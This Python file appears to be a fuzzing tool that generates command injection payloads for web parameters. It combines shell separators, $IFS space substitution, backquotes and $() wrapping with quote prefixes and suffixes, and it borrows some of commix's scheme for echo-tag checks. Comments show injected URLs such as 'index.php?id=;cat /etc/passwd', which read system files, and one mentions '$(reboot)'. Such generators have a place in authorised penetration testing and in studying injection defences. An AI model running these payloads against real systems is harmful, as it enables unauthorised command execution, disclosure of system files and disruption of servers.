#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 17/3/30 上午10:34
# @Author  : Komi
# @File    : make_payload.py
# @Ver:    : 0.1


class PayloadGenerate:
    def __init__(self, base_command_list):
        self.base_command = base_command_list
        self.fuzzing_payloads_list = []
        self.fuzzing_finished_url = []

        # The white-spaces
        self.WHITESPACE = ["$IFS", "%20"]

        # The command injection suffixes.
        self.SUFFIXES = ["'", "\""]

        # The command injection separators.
        self.SEPARATORS = [";", "|", "&", "||"]

        # The command injection prefixes.
        self.PREFIXES = ["'", "\""]

    def add_prefixes(self, payload, prefix):
        payload = prefix + payload

        return payload

    def add_suffixes(self, payload, suffix):
        payload = payload + suffix

        return payload

    def add_sp_before(self, payload, sp):
        if payload:
            return sp + payload
        else:
            return ''

    def add_single_quote(self, s):
        if s:
            return "'{}'".format(s)
        else:
            return ''

    def add_double_quotes(self, s):
        if s:
            return '"{}"'.format(s)
        else:
            return ''

    def replace_space(self, payload, whitespace):
        if payload:
            return payload.replace(' ', whitespace)
        else:
            return ''

    # `whoami`
    def add_backquote(self, payload):
        if payload:
            return "`{}`".format(payload)
        else:
            return ''

    # $(reboot)
    def add_brackets(self, payload):
        if payload:
            return "$({})".format(payload)
        else:
            return ''

    # 这是取的commix的payload生成方式
    def make_commix_payloads(self, TAG):

        for whitespace in self.WHITESPACE:
            for prefix in self.PREFIXES:
                for suffix in self.SUFFIXES:
                    for sp in self.SEPARATORS:
                        payloads = []
                        p1 = 'echo {}'.format(TAG)
                        p2 = 'echo {}'.format(self.add_single_quote(TAG))
                        p3 = 'echo {}'.format(self.add_double_quotes(TAG))
                        payloads += [p1, p2, p3]

                        payloads += [self.add_sp_before(p1, sp), self.add_sp_before(p2, sp), self.add_sp_before(p3, sp)]
                        payloads += [self.replace_space(p1, whitespace), self.replace_space(p2, whitespace), self.replace_space(p3, whitespace)]
                        payloads += [self.replace_space(self.add_sp_before(p1, sp), whitespace), self.replace_space(self.add_sp_before(p2, sp),whitespace),
                                         self.replace_space(self.add_sp_before(p3, sp),whitespace)]

                        # Fix prefixes / suffixes
                        for payload in payloads:
                            payload = self.add_prefixes(payload, prefix)
                            payload = self.add_suffixes(payload, suffix)

                            self.fuzzing_payloads_list.append(payload)

    # 这我自定义的payload
    def fuzz_mypayloads(self):
        for whitespace in self.WHITESPACE:
            for prefix in self.PREFIXES:
                for suffix in self.SUFFIXES:
                    for sp in self.SEPARATORS:
                        for cmd in self.base_command:
                            payloads = []
                            # index.php?id=cat /etc/passwd
                            payloads += [cmd]
                            # index.php?id=`cat /etc/passwd`
                            payloads += [self.add_backquote(cmd)]
                            # index.php?id=$(cat /etc/passwd)
                            payloads += [self.add_brackets(cmd)]
                            # index.php?id=;cat /etc/passwd
                            payloads += [self.add_sp_before(cmd, sp)]
                            # index.php?id=;`cat /etc/passwd`
                            payloads += [self.add_sp_before(self.add_backquote(cmd), sp)]
                            # index.php?id=;$(cat /etc/passwd)
                            payloads += [self.add_sp_before(self.add_brackets(cmd), sp)]
                            # index.php?id=cat$IFS/etc/passwd
                            payloads += [self.replace_space(cmd, whitespace)]
                            # index.php?id=;cat$IFS/etc/passwd
                            payloads += [self.replace_space(self.add_sp_before(cmd, sp), whitespace)]
                            # index.php?id='cat /etc/passwd'
                            for payload in payloads:
                                payload = self.add_prefixes(payload, prefix)
                                payload = self.add_suffixes(payload, suffix)

                                self.fuzzing_payloads_list.append(payload)
